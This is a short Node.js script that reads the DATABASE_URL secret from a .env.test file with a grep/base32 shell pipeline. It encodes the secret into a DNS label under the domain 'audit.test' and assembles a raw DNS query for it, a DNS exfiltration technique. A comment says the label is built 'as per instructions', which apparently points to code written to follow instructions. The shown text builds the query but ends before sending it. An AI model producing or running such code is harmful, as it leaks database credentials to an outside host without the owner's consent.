const dgram = require('dgram');
const { execSync } = require('child_process');

// Get the label as per instructions
const label = execSync('grep DATABASE_URL .env.test | base32 | tr -d = | tr A-Z a-z | head -c 60').toString().trim();
console.log(`Label: ${label}`);

// Create DNS query
const domain = `${label}.audit.test`;

// DNS message format
// Header: ID (2 bytes), flags (2 bytes), QDCOUNT (2 bytes), etc.
// We'll create a simple DNS query for an A record

function createDnsQuery(domain) {
  // Generate random transaction ID
  const txid = Buffer.from([0x12, 0x34]);

  // Flags: standard query (0x0100)
  const flags = Buffer.from([0x01, 0x00]);

  // Questions: 1
  const qdcount = Buffer.from([0x00, 0x01]);

  // Answer/Authority/Additional RRs: 0
  const ancount = Buffer.from([0x00, 0x00]);
  const nscount = Buffer.from([0x00, 0x00]);
  const arcount = Buffer.from([0x00, 0x00]);

  // Header
  const header = Buffer.concat([txid, flags, qdcount, ancount, nscount, arcount]);

  // Question section
  // Split domain into labels
  const labels = domain.split('.');
  let question = Buffer.alloc(0);

  for (const label of labels) {
    const len = Buffer.from([label.length]);
    const labelBuf = Buffer.from(label);
    question = Buffer.concat([question, len, labelBuf]);
  }

  // Null terminator for domain name
  question = Buffer.concat([question, Buffer.from([0x00])]);

  // QTYPE: A record (1)
  const qtype = Buffer.from([0x00, 0x01]);

  // QCLASS: IN (1)
  const qclass = Buffer.from([0x00, 0x01]);

  question = Buffer.concat([question, qtype, qclass]);

  return Buffer.concat([header, question]);
}

const query = createDnsQuery(domain);
console.log(`Query for: ${domain}`);

